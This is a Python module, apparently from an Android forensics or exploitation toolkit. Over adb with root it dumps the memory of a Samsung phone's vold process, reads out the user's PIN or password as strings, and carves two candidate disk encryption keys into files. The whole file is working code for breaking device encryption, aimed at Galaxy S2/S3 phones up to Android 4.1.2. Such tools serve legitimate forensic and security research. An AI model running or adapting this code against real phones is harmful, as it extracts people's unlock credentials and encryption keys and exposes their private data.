from adb.adb import ADB
import re
import sys
import string
import printer
import ConfigParser
from collections import namedtuple
from binascii import *
from sandutils import *
import os

class GetKey:

   def __init__(self, printer, config, project, adb_path="adb"):
      self.printer=printer
      self.params={"adbpath":{"description":"Path of the adb command",
			      "value":adb_path,
			      "required":True
			      },
		  "dumpfile":{"description":"Where to save the memory dumpfile with the filename",
			      "value":"dumpfile",
			      "required":True
			      },
		  "out_dir":{"description":"Where to generate the results and download files on the computer.",
			      "value":"results",
			      "required":True
			      },
		  "dekfile":{"description":"Where to generate the results and download files on the computer.",
			      "value":"dek.bin",
			      "required":True
			      },
		  "phonewithos":{"description":"The samsung hardware and the android version",
			      "value":"GT-I9300 4.1.2",
			      "required":True
			      },

		  }
      self.adb = ADB(self.params["adbpath"]["value"])
      self.out_dir=self.params["out_dir"]["value"]
      self.dumpfile = self.params["dumpfile"]["value"]
      self.dekfile = self.params["dekfile"]["value"]
      self.project=project

   def setparams(self, params):
      self.params=params
      self.adb = ADB(self.params["adbpath"]["value"])
      self.dumpfile = self.params["dumpfile"]["value"]
      self.dekfile = self.params["dekfile"]["value"]
      self.phone = self.params["phonewithos"]["value"]
      self.out_dir = self.params["out_dir"]["value"]
   
   def getparams(self):
      return self.params

   def get_vold_data_segment(self):
      self.printer.print_debug("Check for su!")
      su=checkforsu(self.adb)
      if (su==""):
	 self.printer.print_err("The su comand was not found, hope adb have immediate root access!")
	 su=""
      
      #No magic here, the phone should be fully booted for this module
      self.dest_dir="/data/local/tmp"

      ps=self.adb.shell_command("su -c ps")
      for process in ps.splitlines():
	 if(process.rfind("vold") != -1 ):
	    process=re.sub("\s+", ' ' , process)	
	    self.voldpid=process.split(' ')[1]
      
      self.printer.print_debug("Found vold process id: %s!" % self.voldpid)
      memsegments=self.adb.shell_command("su -c cat /proc/%s/maps" % self.voldpid).splitlines()
      for segment in memsegments:
	 if(re.match(".*w-p.*vold.*", segment)!=None):
	    addresses=segment.split(" ")[0].split("-")
	    self.datastart=addresses[0]
	    self.dataend=addresses[1]
	    self.numberofbytes=int(addresses[1],16)-int(addresses[0],16)

      self.printer.print_debug("The data segment addresses are: %s - %s" % (self.datastart, self.dataend))
      
      self.printer.print_info("Copy the memory dumper to %s." % (self.dest_dir))
 
      push=self.adb.push_local_file("dump_android_memory/dump_android_memory","%s" % self.dest_dir)
      if(push.find("bytes")==-1):
	 self.print_info_adb(push, False)
	 return -1

      self.printer.print_ok("Copy - Done")
      self.print_info_adb(push.rstrip("\n"))
      
      self.printer.print_info("Run the memory dumper.")
      
      dump=self.adb.shell_command("su -c /data/local/tmp/dump_android_memory %s 0x%s %d %s/dumpfile" % (self.voldpid, self.datastart, self.numberofbytes, self.dest_dir))
      if(dump):
	 self.printer.print_info_adb(dump,False)
	 return -1
      self.printer.print_ok("Memory dumber - Done")

      self.printer.print_info("Download the dump file")
      
      pull=self.adb.get_remote_file("/data/local/tmp/dumpfile","%s/%s_%s" % (self.out_dir, self.project, self.dumpfile))
      if(pull.find("bytes")==-1):
	 self.print_info_adb(pull,False)
	 return -1

      self.printer.print_ok("Download - Done")
      self.print_info_adb(pull.rstrip("\n"))
      
      #Cleanup
      self.printer.print_info("Cleaning up! Please check the %s folder. Unsuccessull cleanup weakens the security of the phone!!!!" % self.dest_dir)
      out=self.adb.shell_command(su+"rm %s/dumpfile" % self.dest_dir)
      out=self.adb.shell_command(su+"rm %s/dump_android_memory" % self.dest_dir)
      self.printer.print_ok("Clean up - Done")

   def getpin(self):
      buff=""
      strings=self.strings("%s/%s_%s" % (self.out_dir, self.project, self.dumpfile));
      self.printer.print_info("Following strings found in the vold memory segment:")
      for entry in strings:
	 #self.printer.print_info("  %s:%d" % (entry.string, entry.pos))
	 self.printer.print_info("  %s" % (entry.string))
      self.printer.print_info("Assuming the last one is the pin/password, let's find the DEK")
      last_entry=strings[len(strings)-1]
      index=len(last_entry.string)+last_entry.pos
      try:
	 f=open("%s/%s_%s" % (self.out_dir, self.project, self.dumpfile),"rb")
	 try:
	    buff=f.read(4096)
	 finally:
	    f.close()
      except IOError as e:
	 self.printer.print_err("I/O error({0}): {1} {2}".format(e.errno, e.strerror, "%s/%s_%s" % (self.out_dir, self.project, self.dumpfile)))
	 return -1
      
      for i in range(index+1,index+200):
	 if(buff[i]!='\0'):
	    break
      
      #Because we search for the first non zero, the search can be broken. 
      dek1=buff[i:i+32]
      self.printer.print_info("The first possible key is:")
      self.printer.print_ok(hexlify(dek1))
      dek2=buff[i-1:i-1+32]
      self.printer.print_info("The second possible key is:")
      self.printer.print_ok(hexlify(dek2))
      
      self.printer.print_info("Creating two files:")
      self.printer.print_ok("%s/%s_%s.1" % (self.out_dir, self.project, self.dekfile))
      self.printer.print_ok("%s/%s_%s.2" % (self.out_dir, self.project, self.dekfile))

      self.printer.print_info("If they are not working, analyze the dumpfile manually and you will find the key. It works for S2 and S3 until 4.1.2.")
      
      try:
	 f=open("%s/%s_%s.1" % (self.out_dir, self.project, self.dekfile),"wb")
	 try:
	       f.write(dek1)
	 finally:
	    f.close()
      except IOError as e:
	 self.printer.print_err("I/O error({0}): {1} {2}/{3}_footer".format(e.errno, e.strerror, self.out_dir, self.project))
	 return -1

      try:
	 f=open("%s/%s_%s.2" % (self.out_dir, self.project, self.dekfile),"wb")
	 try:
	       f.write(dek2)
	 finally:
	    f.close()
      except IOError as e:
	 self.printer.print_err("I/O error({0}): {1} {2}/{3}_footer".format(e.errno, e.strerror, self.out_dir, self.project))
	 return -1

 
      return 1




   def print_info_adb(self,message, ok=True):
      if(ok):
	 self.printer.print_info("OK! Received the following from adb: %s" %message)
      else:
	 self.printer.print_err("ERROR! Received the following from adb: %s" %message)
   
   def strings(self,filename):
      pos=0
      strings=[]
      s_entry=namedtuple("s_entry","string pos")
      printable=set(string.printable)
      found_str=""
      fh=open(filename,"rb")
      data=fh.read(4096)
      fh.close()
      pos=0
      for char in data:
	 pos+=1
	 if char in printable:
	    found_str+=char
	 elif len(found_str) >= 4:
	    strings.append(s_entry(found_str, pos))
	    found_str=""
	 else:
	    found_str=""
      return strings
      
#prn=printer.Printer()      
#getkey = GetKey(prn)
#if(getkey.get_vold_data_segment()==-1):
#   print "Could not get vold memory."
#getkey.printer.print_info("Extract the strings from the memory dump. The password or pin should be there.")
#getkey.getpin()

